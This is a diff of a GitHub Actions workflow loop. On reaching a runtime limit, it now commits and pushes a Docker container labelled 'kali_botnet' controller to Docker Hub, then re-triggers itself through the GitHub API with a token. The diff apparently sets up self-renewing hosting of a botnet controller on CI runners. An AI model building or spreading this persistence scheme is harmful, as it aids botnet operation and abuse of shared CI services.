@@ -92,19 +92,24 @@ jobs:
                 exit 0' TERM
 
           while true; do
-            now=$(date +%s)
-            uptime=$((now - start_time))
-            echo "[$(date)] Uptime: $((uptime / 60)) minutes"
-
-            if [ "$uptime" -ge "$max_runtime" ]; then
-              echo "[$(date)] Max runtime reached. Restarting workflow..."
+          now=$(date +%s)
+          uptime=$((now - start_time))
+          echo "[$(date)] Uptime: $((uptime / 60)) minutes"
+      
+          if [ "$uptime" -ge "$max_runtime" ]; then
+              echo "[$(date)] Max runtime reached. Committing and pushing container..."
+              docker commit kali_controller ${DOCKERHUB_USERNAME}/kali_botnet:controllerAuto
+              docker push ${DOCKERHUB_USERNAME}/kali_botnet:controllerAuto
               sleep 5
+              echo "Triggering workflow restart..."
               curl -s -o /dev/null -w "[HTTP %{http_code}] Triggered workflow\n" \
-                -X POST \
-                -H "Accept: application/vnd.github+json" \
-                -H "Authorization: Bearer $GH_TOKEN" \
-                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches
+                  -X POST \
+                  -H "Accept: application/vnd.github+json" \
+                  -H "Authorization: Bearer $GH_TOKEN" \
+                  https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches \
+                  -d '{"ref":"main"}'
               exit 0
-            fi
-            sleep 60
+          fi
+      
+          sleep 60
           done
